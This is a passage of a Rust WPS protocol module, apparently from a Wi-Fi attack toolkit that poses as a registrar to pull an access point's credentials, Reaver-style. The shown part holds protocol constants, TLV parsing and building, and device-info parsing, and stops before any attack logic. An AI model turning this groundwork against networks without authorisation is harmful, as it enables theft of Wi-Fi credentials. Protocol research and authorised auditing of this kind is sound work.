//! WPS (Wi-Fi Protected Setup) protocol module.
//!
//! Pure protocol layer: TLV parsing/building, message construction, PIN validation,
//! and Pixie Dust data extraction. No I/O, no threads, no USB.
//!
#![allow(dead_code)]
#![allow(unused_imports)]
//! WPS uses big-endian TLV encoding: Type(2) + Length(2) + Value(variable).
//! The EAP-WSC framing wraps WPS messages inside EAP Expanded Type (254)
//! with WFA Vendor-ID (00:37:2A) and Vendor-Type (1 = SimpleConfig).
//!
//! Reference: Wi-Fi Simple Configuration Technical Specification v2.0.7,
//!            wifi-map/libwifikit/attacks/attack_wps.c

use sha2::{Sha256, Digest};
use hmac::{Hmac, Mac};
use aes::Aes128;
use cbc::{Decryptor, Encryptor};
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use num_bigint::BigUint;

type HmacSha256 = Hmac<Sha256>;

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Attribute Type Constants
// ═══════════════════════════════════════════════════════════════════════════════

/// WPS TLV attribute type identifiers (big-endian u16 in wire format).
/// Reference: WSC spec Table 28 — Full attribute list.
pub mod attr {
    pub const AP_CHANNEL: u16 = 0x1001;
    pub const ASSOC_STATE: u16 = 0x1002;
    pub const AUTH_TYPE: u16 = 0x1003;
    pub const AUTH_TYPE_FLAGS: u16 = 0x1004;
    pub const AUTHENTICATOR: u16 = 0x1005;
    pub const CONFIG_METHODS: u16 = 0x1008;
    pub const CONFIG_ERROR: u16 = 0x1009;
    pub const CONFIRMATION_URL4: u16 = 0x100A;
    pub const CONFIRMATION_URL6: u16 = 0x100B;
    pub const CONNECTION_TYPE: u16 = 0x100C;
    pub const CONNECTION_TYPE_FLAGS: u16 = 0x100D;
    pub const CREDENTIAL: u16 = 0x100E;
    pub const ENCRYPTION_TYPE: u16 = 0x100F;
    pub const ENCRYPTION_TYPE_FLAGS: u16 = 0x1010;
    pub const DEVICE_NAME: u16 = 0x1011;
    pub const DEVICE_PASSWORD_ID: u16 = 0x1012;
    pub const E_HASH1: u16 = 0x1014;
    pub const E_HASH2: u16 = 0x1015;
    pub const E_SNONCE1: u16 = 0x1016;
    pub const E_SNONCE2: u16 = 0x1017;
    pub const ENCRYPTED_SETTINGS: u16 = 0x1018;
    pub const ENROLLEE_NONCE: u16 = 0x101A;
    pub const FEATURE_ID: u16 = 0x101B;
    pub const IDENTITY: u16 = 0x101C;
    pub const IDENTITY_PROOF: u16 = 0x101D;
    pub const KEY_WRAP_AUTHENTICATOR: u16 = 0x101E;
    pub const KEY_LIFETIME: u16 = 0x101F;
    pub const MAC_ADDRESS: u16 = 0x1020;
    pub const MANUFACTURER: u16 = 0x1021;
    pub const MSG_TYPE: u16 = 0x1022;
    pub const MODEL_NAME: u16 = 0x1023;
    pub const MODEL_NUMBER: u16 = 0x1024;
    pub const NETWORK_INDEX: u16 = 0x1026;
    pub const NETWORK_KEY: u16 = 0x1027;
    pub const NETWORK_KEY_INDEX: u16 = 0x1028;
    pub const NEW_DEVICE_NAME: u16 = 0x1029;
    pub const NEW_PASSWORD: u16 = 0x102A;
    pub const OOB_DEVICE_PASSWORD: u16 = 0x102C;
    pub const OS_VERSION: u16 = 0x102D;
    pub const POWER_LEVEL: u16 = 0x102F;
    pub const PSK_CURRENT: u16 = 0x1030;
    pub const PSK_MAX: u16 = 0x1031;
    pub const PUBLIC_KEY: u16 = 0x1032;
    pub const RADIO_ENABLED: u16 = 0x1033;
    pub const REBOOT: u16 = 0x1034;
    pub const REGISTRAR_CURRENT: u16 = 0x1035;
    pub const REGISTRAR_ESTABLISHED: u16 = 0x1036;
    pub const REGISTRAR_LIST: u16 = 0x1037;
    pub const REGISTRAR_MAX: u16 = 0x1038;
    pub const REGISTRAR_NONCE: u16 = 0x1039;
    pub const REQUEST_TYPE: u16 = 0x103A;
    pub const RESPONSE_TYPE: u16 = 0x103B;
    pub const RF_BANDS: u16 = 0x103C;
    pub const R_HASH1: u16 = 0x103D;
    pub const R_HASH2: u16 = 0x103E;
    pub const R_SNONCE1: u16 = 0x103F;
    pub const R_SNONCE2: u16 = 0x1040;
    pub const SELECTED_REGISTRAR: u16 = 0x1041;
    pub const SERIAL_NUMBER: u16 = 0x1042;
    pub const WPS_STATE: u16 = 0x1044;
    pub const SSID: u16 = 0x1045;
    pub const TOTAL_NETWORKS: u16 = 0x1046;
    pub const UUID_E: u16 = 0x1047;
    pub const UUID_R: u16 = 0x1048;
    pub const VENDOR_EXTENSION: u16 = 0x1049;
    pub const VERSION: u16 = 0x104A;
    pub const X509_CERT_REQUEST: u16 = 0x104B;
    pub const X509_CERT: u16 = 0x104C;
    pub const EAP_IDENTITY: u16 = 0x104D;
    pub const MESSAGE_COUNTER: u16 = 0x104E;
    pub const PUBLIC_KEY_HASH: u16 = 0x104F;
    pub const REKEY_KEY: u16 = 0x1050;
    pub const KEY_PROVIDED_AUTO: u16 = 0x1051;
    pub const DOT1X_ENABLED: u16 = 0x1052;
    pub const SELECTED_REGISTRAR_CONFIG_METHODS: u16 = 0x1053;
    pub const PRIMARY_DEVICE_TYPE: u16 = 0x1054;
    pub const SECONDARY_DEVICE_TYPE_LIST: u16 = 0x1055;
    pub const PORTABLE_DEVICE: u16 = 0x1056;
    pub const AP_SETUP_LOCKED: u16 = 0x1057;
    pub const APPLICATION_EXTENSION: u16 = 0x1058;
    pub const EAP_TYPE: u16 = 0x1059;
    pub const INITIALIZATION_VECTOR: u16 = 0x1060;
    pub const KEY_PROVIDED_MANUALLY: u16 = 0x1061;
    pub const DOT1X_802_ENABLED: u16 = 0x1062;
    pub const PERMITTED_CONFIG_METHODS: u16 = 0x1064;
    pub const REQUESTED_DEVICE_TYPE: u16 = 0x106A;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Constants
// ═══════════════════════════════════════════════════════════════════════════════

/// WFA Vendor-ID used in EAP-WSC expanded type: 00:37:2A
pub const WFA_VENDOR_ID: [u8; 3] = [0x00, 0x37, 0x2A];

/// SimpleConfig vendor type (within WFA expanded EAP)
pub const WFA_VENDOR_TYPE_SIMPLECONFIG: [u8; 4] = [0x00, 0x00, 0x00, 0x01];

/// WPS version 1.0 (encoded as 0x10)
pub const WPS_VERSION_1: u8 = 0x10;

/// WPS version 2.0 (encoded as 0x20)
pub const WPS_VERSION_2: u8 = 0x20;

/// DH public key size in bytes (1536-bit / Group 5)
pub const DH_PUBLIC_KEY_LEN: usize = 192;

/// DH private key size in bytes
pub const DH_PRIVATE_KEY_LEN: usize = 192;

/// WPS nonce size in bytes
pub const WPS_NONCE_LEN: usize = 16;

/// WPS hash size (SHA-256)
pub const WPS_HASH_LEN: usize = 32;

/// WPS authenticator size (first 8 bytes of HMAC-SHA-256)
pub const WPS_AUTHENTICATOR_LEN: usize = 8;

/// WPS AuthKey size in bytes
pub const WPS_AUTHKEY_LEN: usize = 32;

/// WPS KeyWrapKey size in bytes
pub const WPS_KEYWRAPKEY_LEN: usize = 16;

/// WPS EMSK size in bytes
pub const WPS_EMSK_LEN: usize = 32;

/// WPS registrar identity string for EAP-Response/Identity.
/// We identify as a Registrar (external entity requesting the AP's credentials),
/// not an Enrollee (device wanting to be configured).
/// Reaver and bully both use this identity.
pub const WPS_REGISTRAR_IDENTITY: &str = "WFA-SimpleConfig-Registrar-1-0";

/// WPS KDF label string
pub const WPS_KDF_LABEL: &str = "Wi-Fi Easy and Secure Key Derivation";

/// WPS KDF output bits: AuthKey(256) + KeyWrapKey(128) + EMSK(256) = 640
pub const WPS_KDF_BITS: u32 = 640;

/// EAP-WSC OpCode values
pub mod opcode {
    pub const WSC_START: u8 = 0x01;
    pub const WSC_ACK: u8 = 0x02;
    pub const WSC_NACK: u8 = 0x03;
    pub const WSC_MSG: u8 = 0x04;
    pub const WSC_DONE: u8 = 0x05;
    pub const WSC_FRAG_ACK: u8 = 0x06;
}

/// EAP-WSC flag bits
pub mod wsc_flags {
    pub const MORE_FRAGMENTS: u8 = 0x01;
    pub const LENGTH_FIELD: u8 = 0x02;
}

/// WPS Device Password ID values
pub mod password_id {
    pub const DEFAULT_PIN: u16 = 0x0000;
    pub const USER_SPECIFIED: u16 = 0x0001;
    pub const MACHINE_SPECIFIED: u16 = 0x0002;
    pub const REKEY: u16 = 0x0003;
    pub const PUSH_BUTTON: u16 = 0x0004;
    pub const REGISTRAR_SPECIFIED: u16 = 0x0005;
}

/// WPS Config Error values
pub mod config_error {
    pub const NO_ERROR: u16 = 0;
    pub const OOB_INTERFACE_READ_ERROR: u16 = 1;
    pub const DECRYPTION_CRC_FAILURE: u16 = 2;
    pub const CHANNEL_24_NOT_SUPPORTED: u16 = 3;
    pub const CHANNEL_50_NOT_SUPPORTED: u16 = 4;
    pub const SIGNAL_TOO_WEAK: u16 = 5;
    pub const NETWORK_AUTH_FAILURE: u16 = 6;
    pub const NETWORK_ASSOC_FAILURE: u16 = 7;
    pub const NO_DHCP_RESPONSE: u16 = 8;
    pub const FAILED_DHCP_CONFIG: u16 = 9;
    pub const IP_ADDR_CONFLICT: u16 = 10;
    pub const NO_CONN_TO_REGISTRAR: u16 = 11;
    pub const MULTIPLE_PBC_DETECTED: u16 = 12;
    pub const ROGUE_SUSPECTED: u16 = 13;
    pub const DEVICE_BUSY: u16 = 14;
    pub const SETUP_LOCKED: u16 = 15;
    pub const MSG_TIMEOUT: u16 = 16;
    pub const REG_SESSION_TIMEOUT: u16 = 17;
    pub const DEVICE_PASSWORD_AUTH_FAILURE: u16 = 18;
}

/// WPS Auth Type flags (bitmask)
pub mod auth_type {
    pub const OPEN: u16 = 0x0001;
    pub const WPA_PERSONAL: u16 = 0x0002;
    pub const SHARED: u16 = 0x0004;
    pub const WPA_ENTERPRISE: u16 = 0x0008;
    pub const WPA2_PERSONAL: u16 = 0x0010;
    pub const WPA2_ENTERPRISE: u16 = 0x0020;
    /// Combined: Open | WPA-PSK | WPA2-PSK (typical enrollee declaration)
    pub const ALL_PERSONAL: u16 = OPEN | WPA_PERSONAL | WPA2_PERSONAL;
}

/// WPS Encryption Type flags (bitmask)
pub mod encryption_type {
    pub const NONE: u16 = 0x0001;
    pub const WEP: u16 = 0x0002;
    pub const TKIP: u16 = 0x0004;
    pub const AES: u16 = 0x0008;
    /// Combined: None | WEP | TKIP | AES (typical enrollee declaration)
    pub const ALL: u16 = NONE | WEP | TKIP | AES;
}

/// WPS Connection Type flags
pub mod conn_type {
    pub const ESS: u8 = 0x01;
    pub const IBSS: u8 = 0x02;
}

/// WPS RF Band flags
pub mod rf_band {
    pub const BAND_2_4_GHZ: u8 = 0x01;
    pub const BAND_5_GHZ: u8 = 0x02;
    pub const BAND_60_GHZ: u8 = 0x04;
    /// Combined: 2.4 GHz + 5 GHz
    pub const DUAL_BAND: u8 = BAND_2_4_GHZ | BAND_5_GHZ;
}

/// WPS Config Methods bitmask
pub mod config_methods {
    pub const USB_FLASH_DRIVE: u16 = 0x0001;
    pub const ETHERNET: u16 = 0x0002;
    pub const LABEL: u16 = 0x0004;
    pub const DISPLAY: u16 = 0x0008;
    pub const EXT_NFC_TOKEN: u16 = 0x0010;
    pub const INT_NFC_TOKEN: u16 = 0x0020;
    pub const NFC_INTERFACE: u16 = 0x0040;
    pub const PUSH_BUTTON: u16 = 0x0080;
    pub const KEYPAD: u16 = 0x0100;
    pub const VIRT_PUSH_BUTTON: u16 = 0x0280;
    pub const PHY_PUSH_BUTTON: u16 = 0x0480;
    pub const VIRT_DISPLAY: u16 = 0x2008;
    pub const PHY_DISPLAY: u16 = 0x4008;
    /// Common enrollee config methods: PBC + Display + Keypad
    pub const ENROLLEE_DEFAULT: u16 = PUSH_BUTTON | DISPLAY | KEYPAD;
}

/// WPS Request Type values
pub mod request_type {
    pub const ENROLLEE_INFO: u8 = 0x00;
    pub const ENROLLEE_OPEN: u8 = 0x01;
    pub const REGISTRAR: u8 = 0x02;
    pub const WLAN_MANAGER_REGISTRAR: u8 = 0x03;
}

/// WPS Response Type values
pub mod response_type {
    pub const ENROLLEE_INFO: u8 = 0x00;
    pub const ENROLLEE_OPEN: u8 = 0x01;
    pub const REGISTRAR: u8 = 0x02;
    pub const AP: u8 = 0x03;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DH Group 5 Prime (RFC 3526, 1536-bit MODP)
// ═══════════════════════════════════════════════════════════════════════════════

/// DH Group 5 prime (1536-bit), big-endian, 192 bytes.
/// Generator g = 2.
pub const DH_GROUP5_PRIME: [u8; 192] = [
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xC9, 0x0F, 0xDA, 0xA2,
    0x21, 0x68, 0xC2, 0x34, 0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
    0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74, 0x02, 0x0B, 0xBE, 0xA6,
    0x3B, 0x13, 0x9B, 0x22, 0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
    0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B, 0x30, 0x2B, 0x0A, 0x6D,
    0xF2, 0x5F, 0x14, 0x37, 0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
    0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6, 0xF4, 0x4C, 0x42, 0xE9,
    0xA6, 0x37, 0xED, 0x6B, 0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
    0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5, 0xAE, 0x9F, 0x24, 0x11,
    0x7C, 0x4B, 0x1F, 0xE6, 0x49, 0x28, 0x66, 0x51, 0xEC, 0xE4, 0x5B, 0x3D,
    0xC2, 0x00, 0x7C, 0xB8, 0xA1, 0x63, 0xBF, 0x05, 0x98, 0xDA, 0x48, 0x36,
    0x1C, 0x55, 0xD3, 0x9A, 0x69, 0x16, 0x3F, 0xA8, 0xFD, 0x24, 0xCF, 0x5F,
    0x83, 0x65, 0x5D, 0x23, 0xDC, 0xA3, 0xAD, 0x96, 0x1C, 0x62, 0xF3, 0x56,
    0x20, 0x85, 0x52, 0xBB, 0x9E, 0xD5, 0x29, 0x07, 0x70, 0x96, 0x96, 0x6D,
    0x67, 0x0C, 0x35, 0x4E, 0x4A, 0xBC, 0x98, 0x04, 0xF1, 0x74, 0x6C, 0x08,
    0xCA, 0x23, 0x73, 0x27, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
];

/// DH Group 5 generator
pub const DH_GROUP5_GENERATOR: u8 = 2;

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Message Type Enum
// ═══════════════════════════════════════════════════════════════════════════════

/// WPS message types as defined in the WSC spec.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum WpsMessageType {
    M1 = 0x04,
    M2 = 0x05,
    M2D = 0x06,
    M3 = 0x07,
    M4 = 0x08,
    M5 = 0x09,
    M6 = 0x0A,
    M7 = 0x0B,
    M8 = 0x0C,
    WscAck = 0x0D,
    WscNack = 0x0E,
    WscDone = 0x0F,
}

impl WpsMessageType {
    /// Parse a message type byte into the enum variant.
    pub fn from_u8(val: u8) -> Option<Self> {
        match val {
            0x04 => Some(Self::M1),
            0x05 => Some(Self::M2),
            0x06 => Some(Self::M2D),
            0x07 => Some(Self::M3),
            0x08 => Some(Self::M4),
            0x09 => Some(Self::M5),
            0x0A => Some(Self::M6),
            0x0B => Some(Self::M7),
            0x0C => Some(Self::M8),
            0x0D => Some(Self::WscAck),
            0x0E => Some(Self::WscNack),
            0x0F => Some(Self::WscDone),
            _ => None,
        }
    }

    /// Human-readable name for display/logging.
    pub fn name(&self) -> &'static str {
        match self {
            Self::M1 => "M1",
            Self::M2 => "M2",
            Self::M2D => "M2D",
            Self::M3 => "M3",
            Self::M4 => "M4",
            Self::M5 => "M5",
            Self::M6 => "M6",
            Self::M7 => "M7",
            Self::M8 => "M8",
            Self::WscAck => "WSC_ACK",
            Self::WscNack => "WSC_NACK",
            Self::WscDone => "WSC_Done",
        }
    }
}

impl std::fmt::Display for WpsMessageType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.name())
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS State Enum
// ═══════════════════════════════════════════════════════════════════════════════

/// WPS configuration state (from WPS State attribute in beacons).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
#[repr(u8)]
pub enum WpsState {
    /// WPS not present or unknown
    #[default]
    None = 0,
    /// WPS enabled, AP not yet configured
    NotConfigured = 1,
    /// WPS enabled, AP already configured
    Configured = 2,
}

impl WpsState {
    pub fn from_u8(val: u8) -> Self {
        match val {
            1 => Self::NotConfigured,
            2 => Self::Configured,
            _ => Self::None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::None => "None",
            Self::NotConfigured => "Not Configured",
            Self::Configured => "Configured",
        }
    }
}

impl std::fmt::Display for WpsState {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.name())
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS TLV System
// ═══════════════════════════════════════════════════════════════════════════════

/// A single WPS TLV attribute (zero-copy reference into the source buffer).
#[derive(Clone, Debug)]
pub struct WpsTlv<'a> {
    /// Attribute type (big-endian u16 from wire)
    pub attr_type: u16,
    /// Value data (slice into original buffer, excludes type+length header)
    pub data: &'a [u8],
}

impl<'a> WpsTlv<'a> {
    /// Read value as u8. Returns None if data length != 1.
    pub fn as_u8(&self) -> Option<u8> {
        if self.data.len() == 1 {
            Some(self.data[0])
        } else {
            None
        }
    }

    /// Read value as big-endian u16. Returns None if data length != 2.
    pub fn as_u16(&self) -> Option<u16> {
        if self.data.len() == 2 {
            Some(u16::from_be_bytes([self.data[0], self.data[1]]))
        } else {
            None
        }
    }

    /// Read value as big-endian u32. Returns None if data length != 4.
    pub fn as_u32(&self) -> Option<u32> {
        if self.data.len() == 4 {
            Some(u32::from_be_bytes([
                self.data[0],
                self.data[1],
                self.data[2],
                self.data[3],
            ]))
        } else {
            None
        }
    }

    /// Read value as UTF-8 string (lossy). Trims trailing nulls.
    pub fn as_string(&self) -> String {
        let trimmed = self.data.iter().rposition(|&b| b != 0)
            .map(|pos| &self.data[..=pos])
            .unwrap_or(self.data);
        String::from_utf8_lossy(trimmed).into_owned()
    }
}

/// Iterator over WPS TLV attributes in a byte buffer.
/// Safely handles malformed data by stopping iteration on invalid TLVs.
#[derive(Clone, Debug)]
pub struct WpsTlvIterator<'a> {
    data: &'a [u8],
    offset: usize,
}

impl<'a> WpsTlvIterator<'a> {
    /// Create a new TLV iterator over the given data buffer.
    pub fn new(data: &'a [u8]) -> Self {
        Self { data, offset: 0 }
    }
}

impl<'a> Iterator for WpsTlvIterator<'a> {
    type Item = WpsTlv<'a>;

    fn next(&mut self) -> Option<Self::Item> {
        // Need at least 4 bytes for type(2) + length(2)
        if self.offset + 4 > self.data.len() {
            return None;
        }

        let attr_type = u16::from_be_bytes([
            self.data[self.offset],
            self.data[self.offset + 1],
        ]);
        let length = u16::from_be_bytes([
            self.data[self.offset + 2],
            self.data[self.offset + 3],
        ]) as usize;

        self.offset += 4;

        // Check that value fits within buffer
        if self.offset + length > self.data.len() {
            // Malformed TLV — stop iteration
            self.offset = self.data.len();
            return None;
        }

        let data = &self.data[self.offset..self.offset + length];
        self.offset += length;

        Some(WpsTlv { attr_type, data })
    }
}

/// Find a specific TLV attribute by type in a WPS data buffer.
/// Returns the first matching TLV's value, or None.
pub fn tlv_find<'a>(data: &'a [u8], attr_type: u16) -> Option<&'a [u8]> {
    WpsTlvIterator::new(data)
        .find(|tlv| tlv.attr_type == attr_type)
        .map(|tlv| tlv.data)
}

/// Find a specific TLV attribute and return it as a `WpsTlv`.
pub fn tlv_find_tlv<'a>(data: &'a [u8], attr_type: u16) -> Option<WpsTlv<'a>> {
    WpsTlvIterator::new(data).find(|tlv| tlv.attr_type == attr_type)
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS TLV Builder
// ═══════════════════════════════════════════════════════════════════════════════

/// Builder for constructing WPS TLV-encoded messages.
/// Appends TLV attributes to an internal Vec<u8>.
#[derive(Clone, Debug)]
pub struct WpsTlvBuilder {
    buf: Vec<u8>,
}

impl WpsTlvBuilder {
    /// Create a new empty TLV builder.
    pub fn new() -> Self {
        Self { buf: Vec::with_capacity(512) }
    }

    /// Create a new TLV builder with the given initial capacity.
    pub fn with_capacity(capacity: usize) -> Self {
        Self { buf: Vec::with_capacity(capacity) }
    }

    /// Append a raw TLV: Type(2) + Length(2) + Value(variable).
    pub fn put(&mut self, attr_type: u16, value: &[u8]) -> &mut Self {
        let len = value.len() as u16;
        self.buf.extend_from_slice(&attr_type.to_be_bytes());
        self.buf.extend_from_slice(&len.to_be_bytes());
        self.buf.extend_from_slice(value);
        self
    }

    /// Append a u8 value TLV.
    pub fn put_u8(&mut self, attr_type: u16, value: u8) -> &mut Self {
        self.put(attr_type, &[value])
    }

    /// Append a big-endian u16 value TLV.
    pub fn put_u16(&mut self, attr_type: u16, value: u16) -> &mut Self {
        self.put(attr_type, &value.to_be_bytes())
    }

    /// Append a big-endian u32 value TLV.
    pub fn put_u32(&mut self, attr_type: u16, value: u32) -> &mut Self {
        self.put(attr_type, &value.to_be_bytes())
    }

    /// Append a string value TLV (no null terminator).
    pub fn put_str(&mut self, attr_type: u16, value: &str) -> &mut Self {
        self.put(attr_type, value.as_bytes())
    }

    /// Return the accumulated bytes, consuming the builder.
    pub fn finish(self) -> Vec<u8> {
        self.buf
    }

    /// Return a reference to the current buffer contents.
    pub fn as_bytes(&self) -> &[u8] {
        &self.buf
    }

    /// Return the current length of accumulated data.
    pub fn len(&self) -> usize {
        self.buf.len()
    }

    /// Return true if no data has been written.
    pub fn is_empty(&self) -> bool {
        self.buf.is_empty()
    }
}

impl Default for WpsTlvBuilder {
    fn default() -> Self {
        Self::new()
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Device Info (parsed from beacons, probe responses, M1, M2)
// ═══════════════════════════════════════════════════════════════════════════════

/// WPS device information extracted from WPS IEs in beacons/probe responses,
/// or from M1/M2 WPS messages.
#[derive(Clone, Debug, Default)]
pub struct WpsDeviceInfo {
    /// WPS version (0x10 = 1.0, 0x20 = 2.0)
    pub version: u8,
    /// WPS configuration state
    pub state: WpsState,
    /// AP Setup Locked (WPS anti-brute-force active)
    pub locked: bool,
    /// Manufacturer string
    pub manufacturer: String,
    /// Model name string
    pub model_name: String,
    /// Model number string
    pub model_number: String,
    /// Serial number string
    pub serial_number: String,
    /// Device name string
    pub device_name: String,
    /// UUID (16 bytes, from UUID-E or UUID-R)
    pub uuid: [u8; 16],
    /// Primary Device Type (8 bytes: category(2) + OUI(4) + subcategory(2))
    pub primary_device_type: [u8; 8],
    /// Config methods bitmask
    pub config_methods: u16,
    /// RF bands bitmask
    pub rf_bands: u8,
    /// OS version (with highest bit indicating ownership)
    pub os_version: u32,
    /// Auth type flags bitmask
    pub auth_type_flags: u16,
    /// Encryption type flags bitmask
    pub encryption_type_flags: u16,
    /// Selected Registrar active
    pub selected_registrar: bool,
    /// Device Password ID (0=default PIN, 4=PBC, etc.)
    pub device_password_id: u16,
    /// Response type
    pub response_type: u8,
    /// Request type
    pub request_type: u8,
    /// MAC address (from MAC_ADDRESS attribute, if present)
    pub mac_address: Option<[u8; 6]>,
}

impl WpsDeviceInfo {
    /// Returns true if WPS push-button mode is active (Selected Registrar + PBC password ID).
    pub fn is_pbc_active(&self) -> bool {
        self.selected_registrar && self.device_password_id == password_id::PUSH_BUTTON
    }

    /// Returns true if PIN mode is indicated.
    pub fn is_pin_mode(&self) -> bool {
        self.device_password_id == password_id::DEFAULT_PIN
            || self.device_password_id == password_id::USER_SPECIFIED
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Message (parsed from EAP-WSC body)
// ═══════════════════════════════════════════════════════════════════════════════

/// Parsed WPS message with all recognized attributes extracted.
#[derive(Clone, Debug)]
pub struct WpsMessage {
    /// The WPS message type (M1, M2, M3, etc.)
    pub msg_type: WpsMessageType,
    /// Enrollee nonce (16 bytes) — present in all messages
    pub enrollee_nonce: Option<[u8; 16]>,
    /// Registrar nonce (16 bytes) — present from M2 onward
    pub registrar_nonce: Option<[u8; 16]>,
    /// DH public key (192 bytes for Group 5)
    pub public_key: Option<Vec<u8>>,
    /// E-Hash1 (32 bytes, in M3)
    pub e_hash1: Option<[u8; 32]>,
    /// E-Hash2 (32 bytes, in M3)
    pub e_hash2: Option<[u8; 32]>,
    /// R-Hash1 (32 bytes, in M4)
    pub r_hash1: Option<[u8; 32]>,
    /// R-Hash2 (32 bytes, in M4)
    pub r_hash2: Option<[u8; 32]>,
    /// E-SNonce1 (16 bytes, in M5 decrypted settings)
    pub e_snonce1: Option<[u8; 16]>,
    /// E-SNonce2 (16 bytes, in M7 decrypted settings)
    pub e_snonce2: Option<[u8; 16]>,
    /// R-SNonce1 (16 bytes, in M4 decrypted settings)
    pub r_snonce1: Option<[u8; 16]>,
    /// R-SNonce2 (16 bytes, in M6 decrypted settings)
    pub r_snonce2: Option<[u8; 16]>,
    /// Authenticator (8 bytes) — present in M3-M8
    pub authenticator: Option<[u8; 8]>,
    /// Raw encrypted settings blob (IV + ciphertext)
    pub encrypted_settings: Option<Vec<u8>>,
    /// Config error code from WSC_NACK
    pub config_error: Option<u16>,
    /// Device info extracted from the message TLVs
    pub device_info: WpsDeviceInfo,
    /// Raw WPS TLV body (for hash chaining / authenticator computation)
    pub raw_body: Vec<u8>,
}

impl WpsMessage {
    fn new(msg_type: WpsMessageType, raw_body: Vec<u8>) -> Self {
        Self {
            msg_type,
            enrollee_nonce: None,
            registrar_nonce: None,
            public_key: None,
            e_hash1: None,
            e_hash2: None,
            r_hash1: None,
            r_hash2: None,
            e_snonce1: None,
            e_snonce2: None,
            r_snonce1: None,
            r_snonce2: None,
            authenticator: None,
            encrypted_settings: None,
            config_error: None,
            device_info: WpsDeviceInfo::default(),
            raw_body,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS IE Parser (from beacon/probe response vendor-specific IE)
// ═══════════════════════════════════════════════════════════════════════════════

/// Parse WPS device information from the body of a WPS vendor-specific IE.
///
/// The caller must have already stripped the IE tag (221), length, and the
/// WPS OUI (00:50:F2:04). The `data` parameter is the WPS TLV body only.
///
/// Returns None if no valid WPS TLVs are found.
pub fn parse_wps_ie(data: &[u8]) -> Option<WpsDeviceInfo> {
    if data.len() < 4 {
        return None;
    }

    let mut info = WpsDeviceInfo::default();
    let mut found_any = false;

    for tlv in WpsTlvIterator::new(data) {
        found_any = true;
        match tlv.attr_type {
            attr::VERSION => {
                if let Some(v) = tlv.as_u8() {
                    info.version = v;
                }
            }
            attr::WPS_STATE => {
                if let Some(v) = tlv.as_u8() {
                    info.state = WpsState::from_u8(v);
                }
            }
            attr::AP_SETUP_LOCKED => {
                if let Some(v) = tlv.as_u8() {
                    info.locked = v != 0;
                }
            }
            attr::SELECTED_REGISTRAR => {
                if let Some(v) = tlv.as_u8() {
                    info.selected_registrar = v != 0;
                }
            }
            attr::DEVICE_PASSWORD_ID => {
                if let Some(v) = tlv.as_u16() {
                    info.device_password_id = v;
                }
            }
            attr::SELECTED_REGISTRAR_CONFIG_METHODS => {
                if let Some(v) = tlv.as_u16() {
                    info.config_methods = v;
                }
            }
            attr::CONFIG_METHODS => {
                if let Some(v) = tlv.as_u16() {
                    // Only set if not already set by SELECTED_REGISTRAR_CONFIG_METHODS
                    if info.config_methods == 0 {
                        info.config_methods = v;
                    }
                }
            }
            attr::RESPONSE_TYPE => {
                if let Some(v) = tlv.as_u8() {
                    info.response_type = v;
                }
            }
            attr::REQUEST_TYPE => {
                if let Some(v) = tlv.as_u8() {
                    info.request_type = v;
                }
            }
            attr::UUID_E => {
                if tlv.data.len() == 16 {
                    info.uuid.copy_from_slice(tlv.data);
                }
            }
            attr::UUID_R => {
                if tlv.data.len() == 16 {
                    info.uuid.copy_from_slice(tlv.data);
                }
            }
            attr::MANUFACTURER => {
                info.manufacturer = tlv.as_string();
            }
            attr::MODEL_NAME => {
                info.model_name = tlv.as_string();
            }
            attr::MODEL_NUMBER => {
                info.model_number = tlv.as_string();
            }
            attr::SERIAL_NUMBER => {
                info.serial_number = tlv.as_string();
            }
            attr::DEVICE_NAME => {
                info.device_name = tlv.as_string();
            }
            attr::PRIMARY_DEVICE_TYPE => {
                if tlv.data.len() == 8 {
                    info.primary_device_type.copy_from_slice(tlv.data);
                }
            }
            attr::RF_BANDS => {
                if let Some(v) = tlv.as_u8() {
                    info.rf_bands = v;
                }
            }
            attr::OS_VERSION => {
                if let Some(v) = tlv.as_u32() {
                    info.os_version = v;
                }
            }
            attr::AUTH_TYPE_FLAGS => {
                if let Some(v) = tlv.as_u16() {
                    info.auth_type_flags = v;
                }
            }
            attr::ENCRYPTION_TYPE_FLAGS => {
                if let Some(v) = tlv.as_u16() {
                    info.encryption_type_flags = v;
                }
            }
            attr::MAC_ADDRESS => {
                if tlv.data.len() == 6 {
                    let mut mac = [0u8; 6];
                    mac.copy_from_slice(tlv.data);
                    info.mac_address = Some(mac);
                }
            }
            _ => {
                // Skip unknown attributes — safe parsing
            }
        }
    }

    if found_any { Some(info) } else { None }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Message Parser (from EAP-WSC body)
// ═══════════════════════════════════════════════════════════════════════════════

/// Parse a WPS message from its TLV body (after stripping the EAP-WSC header).
///
